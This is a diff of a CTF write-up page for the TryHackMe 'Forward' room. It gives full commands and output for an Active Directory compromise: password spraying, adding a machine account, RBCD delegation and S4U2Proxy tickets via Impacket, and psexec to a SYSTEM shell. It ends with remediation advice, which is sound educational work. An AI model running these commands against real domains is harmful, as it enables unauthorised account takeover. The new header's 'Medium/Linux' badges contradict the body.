@@ -1,100 +1,273 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Forward — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Forward — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty hard-badge">Hard</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Forward</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Windows Server 2019 (Build 17763) — Active Directory · BloodHound → Kerberoasting → Password Spray → RBCD → Domain Admin</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Windows Server 2019 (Build 17763) — Active Directory</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.48.167.228 (DC01.ctf.local)</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-medium">Medium</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="forward-tryhackme-writeup">Forward - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Forward</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Windows Server 2019 (Build 17763)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Domain</strong></td>
+<td style="text-align: left;"><code>ctf.local</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target Hostname / IP</strong></td>
+<td style="text-align: left;"><code>DC01.ctf.local</code> (<code>10.48.167.228</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Hard</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Active Directory Enumeration (BloodHound), Kerberoasting attempt, Internal Credential Harvesting via RDP (<code>j.smith</code>), Password Spraying (<code>nxc</code>), Resource-Based Constrained Delegation (RBCD) via Impacket (<code>addcomputer</code>, <code>rbcd</code>, <code>getST</code>, <code>psexec</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114162634.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<ol>
+<li><strong>Reconnaissance &amp; BloodHound</strong>:<br />
+   - <code>nmap -sV -sC 10.48.167.228 -Pn</code> identified Active Directory domain services on <code>DC01.ctf.local</code>.<br />
+   - Enumerated domain with BloodHound; identified high-value accounts <code>svc.helpdesk</code> and <code>r.williams</code>.</li>
+<li><strong>Credential Harvesting &amp; Password Spraying</strong>:<br />
+   - Attempted Kerberoasting on <code>svc.helpdesk</code> and hash cracking via Hashcat (<code>-m 13100</code>), but password was not in wordlist.<br />
+   - Connected via RDP as user <code>j.smith</code>, finding stored credentials for <code>t.jones</code> (<code>********</code>).<br />
+   - Performed password spraying with NetExec:<br />
+<code>nxc smb DC01.ctf.local -u user.txt -p '********' --continue-on-success</code><br />
+     ➔ Successfully compromised <code>r.williams:********</code>.</li>
+<li><strong>Privilege Escalation via RBCD (Resource-Based Constrained Delegation)</strong>:<br />
+   - BloodHound revealed <code>r.williams</code> has <code>AddAllowedToAct</code> permissions on <code>DC01.ctf.local</code>.<br />
+   - Created machine account <code>ATTACKER$</code> with password <code>********</code> using <code>impacket-addcomputer -method SAMR</code>.<br />
+   - Configured RBCD delegation using <code>impacket-rbcd</code> allowing <code>ATTACKER$</code> to act on behalf of <code>DC01$</code>.<br />
+   - Requested Kerberos Service Ticket impersonating <code>Administrator</code> using <code>impacket-getST</code>.<br />
+   - Exported ticket cache and executed <code>impacket-psexec -k -no-pass DC01.ctf.local</code> to gain an interactive <code>nt authority\system</code> shell.<br />
+   - Read flag: <code>type flag.txt</code> ➔ <code>THM{********************************}</code>.</li>
+</ol>
+<hr />
+<h2 id="2-phase-1-reconnaissance-bloodhound-enumeration">2. Phase 1: Reconnaissance &amp; BloodHound Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We scan the Domain Controller <code>10.48.167.228</code>:</p>
+<pre><code class="language-bash">nmap -sV -sC 10.48.167.228 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114151216.png" /></p>
+<p><strong>Identified Ports:</strong><br />
+- <strong>53/tcp</strong>: Simple DNS Plus<br />
+- <strong>88/tcp</strong>: Microsoft Windows Kerberos<br />
+- <strong>135/tcp / 593/tcp</strong>: Microsoft Windows RPC<br />
+- <strong>139/tcp / 445/tcp</strong>: Microsoft Windows SMB<br />
+- <strong>389/tcp / 636/tcp</strong>: Microsoft Windows Active Directory LDAP<br />
+- <strong>3389/tcp</strong>: Microsoft Terminal Services (RDP)<br />
+- Domain Name: <code>ctf.local</code>, Computer Name: <code>DC01</code></p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114151354.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114151735.png" /></p>
+<h3 id="22-bloodhound-graph-analysis">2.2 BloodHound Graph Analysis</h3>
+<p>We import domain data into BloodHound to map relationship paths:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114160306.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114152416.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114152436.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114155332.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114155407.png" /></p>
+<p>BloodHound indicates our priority targets:<br />
+- <strong><code>svc.helpdesk</code></strong><br />
+- <strong><code>r.williams</code></strong></p>
+<hr />
+<h2 id="3-phase-2-credential-harvesting-password-spraying">3. Phase 2: Credential Harvesting &amp; Password Spraying</h2>
+<h3 id="31-kerberoasting-attempt-svchelpdesk">3.1 Kerberoasting Attempt (<code>svc.helpdesk</code>)</h3>
+<p>We request Kerberos TGS tickets for SPNs in the domain:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114153638.png" /></p>
+<p>We attempt cracking the ticket for <code>svc.helpdesk</code> using Hashcat mode 13100:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114154751.png" /></p>
+<p>The ticket for <code>svc.helpdesk</code> did not crack, so we move forward with alternative credential sources.</p>
+<h3 id="32-pivoting-via-rdp-jsmith">3.2 Pivoting via RDP (<code>j.smith</code>)</h3>
+<p>We connect via RDP using existing credentials for <code>j.smith</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114155730.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114155751.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261114155834.png" /></p>
+<p>Inside the session, we discover stored credentials:<br />
+- <strong>Username</strong>: <code>t.jones</code><br />
+- <strong>Password</strong>: <code>********</code></p>
+<h3 id="33-password-spraying-via-netexec">3.3 Password Spraying via NetExec</h3>
+<p>We test the recovered password <code>********</code> across the userlist:</p>
+<pre><code class="language-bash">nxc smb DC01.ctf.local -u user.txt -p '********' --continue-on-success
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114161144.png" /></p>
+<p><strong>Results:</strong></p>
+<pre><code class="language-text">SMB  10.48.167.228  445  DC01  [+] ctf.local\r.williams:********
+SMB  10.48.167.228  445  DC01  [-] ctf.local\svc.helpdesk:******** STATUS_LOGON_FAILURE
+</code></pre>
+<p>User <strong><code>r.williams</code></strong> is successfully compromised!</p>
+<hr />
+<h2 id="4-phase-3-privilege-escalation-via-rbcd-resource-based-constrained-delegation">4. Phase 3: Privilege Escalation via RBCD (Resource-Based Constrained Delegation)</h2>
+<h3 id="41-vulnerability-identification">4.1 Vulnerability Identification</h3>
+<p>In BloodHound, <code>r.williams</code> has <strong><code>AddAllowedToAct</code></strong> privileges over <code>DC01.CTF.LOCAL</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114161356.png" /></p>
+<h3 id="42-step-1-adding-a-machine-account-attacker">4.2 Step 1: Adding a Machine Account (<code>ATTACKER$</code>)</h3>
+<p>Using <code>impacket-addcomputer</code> with SAMR protocol:</p>
+<pre><code class="language-bash">impacket-addcomputer -method SAMR \
+  -computer-name 'ATTACKER$' \
+  -computer-pass 'P@ssw0rd123!' \
+  -dc-ip 10.48.167.228 \
+  'ctf.local/r.williams:********'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114161849.png" /></p>
+<pre><code class="language-text">[*] Successfully added machine account ATTACKER$ with password ********.
+</code></pre>
+<h3 id="43-step-2-configuring-rbcd-on-dc01">4.3 Step 2: Configuring RBCD on <code>DC01</code></h3>
+<p>We write <code>ATTACKER$</code> into the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of <code>DC01$</code>:</p>
+<pre><code class="language-bash">impacket-rbcd -delegate-from 'ATTACKER$' \
+  -delegate-to 'DC01$' \
+  -action write \
+  -dc-ip 10.48.167.228 \
+  'ctf.local/r.williams:********'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114161924.png" /></p>
+<pre><code class="language-text">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ATTACKER$ can now impersonate users on DC01$ via S4U2Proxy
+</code></pre>
+<p>We verify the delegation configuration:</p>
+<pre><code class="language-bash">impacket-rbcd -delegate-to 'DC01$' -action read \
+  -dc-ip 10.48.167.228 'ctf.local/r.williams:********'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114161944.png" /></p>
+<h3 id="44-step-3-requesting-service-ticket-via-s4u2proxy">4.4 Step 3: Requesting Service Ticket via S4U2Proxy</h3>
+<p>We request a Kerberos service ticket for <code>cifs/DC01.ctf.local</code> impersonating <code>Administrator</code>:</p>
+<pre><code class="language-bash">impacket-getST 'ctf.local/ATTACKER$:P@ssw0rd123!' \
+  -spn 'cifs/DC01.ctf.local' \
+  -impersonate Administrator \
+  -dc-ip 10.48.167.228
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114162026.png" /></p>
+<pre><code class="language-text">[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+</code></pre>
+<h3 id="45-step-4-gaining-system-shell-flag-retrieval">4.5 Step 4: Gaining SYSTEM Shell &amp; Flag Retrieval</h3>
+<p>We set the Kerberos cache environment variable and execute <code>impacket-psexec</code>:</p>
+<pre><code class="language-bash">export KRB5CCNAME=./Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+impacket-psexec -k -no-pass DC01.ctf.local
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114162236.png" /></p>
+<pre><code class="language-text">[*] Requesting shares on DC01.ctf.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file KATgsZCZ.exe
+[*] Opening SVCManager on DC01.ctf.local.....
+[*] Creating service cUif on DC01.ctf.local.....
+[*] Starting service cUif.....
+Microsoft Windows [Version 10.0.17763.1821]
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Forward</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Windows Server 2019 (Build 17763)</td></tr>
-      <tr><th>Domain</th><td>ctf.local</td></tr>
-      <tr><th>Target IP</th><td>10.48.167.228 (DC01.ctf.local)</td></tr>
-      <tr><th>Difficulty</th><td>Hard</td></tr>
-      <tr><th>Key Techniques</th><td>BloodHound, RBCD, S4U2Proxy, Kerberoasting, NetExec, Impacket Suite</td></tr>
-    </table>
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<p>We retrieve the Administrator flag:</p>
+<pre><code class="language-cmd">C:\Users\Administrator\Desktop&gt; type flag.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261114162341.png" /></p>
+<ul>
+<li><strong>Flag Captured</strong>: <code>THM{********************************}</code></li>
+</ul>
+<hr />
+<h2 id="5-security-mitigations-remediation">5. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Abuse of <code>AddAllowedToAct</code> (RBCD)</strong></td>
+<td style="text-align: left;">Unprivileged user with write rights on DC object can impersonate Domain Administrator.</td>
+<td style="text-align: left;">1. Audit ACLs on Domain Controller computer objects; ensure only Domain Admins have write permissions to <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.<br>2. Add high-privilege administrative accounts to the <strong>Protected Users</strong> security group to disable Kerberos delegation.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Default <code>MachineAccountQuota</code> (MAQ)</strong></td>
+<td style="text-align: left;">Any domain user can create up to 10 computer accounts (<code>ATTACKER$</code>).</td>
+<td style="text-align: left;">Set <code>ms-DS-MachineAccountQuota</code> to <strong><code>0</code></strong> in Active Directory.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Credential Reuse (<code>********</code>)</strong></td>
+<td style="text-align: left;">Password spraying enables lateral movement and account takeover.</td>
+<td style="text-align: left;">Enforce unique passwords, implement MFA, and deploy LAPS.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="6-tools-used">6. Tools Used</h2>
+<ul>
+<li><strong>Nmap</strong>: Port scanning (<code>nmap -sV -sC 10.48.167.228 -Pn</code>)</li>
+<li><strong>BloodHound</strong>: Active Directory graph analysis</li>
+<li><strong>Hashcat</strong>: Kerberos hash cracking attempt</li>
+<li><strong>NetExec (<code>nxc</code>)</strong>: SMB password spraying</li>
+<li><strong>Impacket Suite</strong>: <code>addcomputer</code>, <code>rbcd</code>, <code>getST</code>, <code>psexec</code></li>
+</ul>
+    </div>
+  </main>
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Active Directory domain services on DC01.ctf.local (10.48.167.228)
-  → BloodHound → targets: svc.helpdesk, r.williams
-  → Kerberoasting svc.helpdesk → Hashcat → not cracked
-  → RDP as j.smith → stored credentials: t.jones : ████████
-  → NetExec spraying: nxc smb DC01 -u user.txt -p '████████' → r.williams : ████████
-  → BloodHound → r.williams has AddAllowedToAct on DC01$
-  → impacket-addcomputer → ATTACKER$ : ████████
-  → impacket-rbcd → delegate ATTACKER$ → DC01$
-  → impacket-getST → S4U2Proxy → Administrator ticket
-  → KRB5CCNAME=... impacket-psexec -k -no-pass DC01.ctf.local
-  → nt authority\system
-  → type flag.txt → THM{████████████████████████████████}</div>
-
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>BloodHound</code></li>
-      <li><code>Hashcat</code></li>
-      <li><code>NetExec (nxc)</code></li>
-      <li><code>Impacket Suite</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
